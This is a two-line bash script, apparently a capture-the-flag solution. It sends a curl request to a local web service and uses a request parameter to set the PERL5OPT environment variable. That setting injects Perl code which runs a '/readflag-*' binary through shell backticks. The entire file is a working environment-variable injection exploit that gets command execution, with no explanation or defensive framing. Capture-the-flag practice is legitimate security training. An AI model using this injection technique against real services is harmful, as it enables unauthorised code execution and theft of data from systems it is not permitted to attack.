#!/bin/bash
curl 'http://localhost:3002/say' --data-raw 'params[input]=aaa&params[env][PERL5OPT]=-Mbase;print(`/readflag-*`)'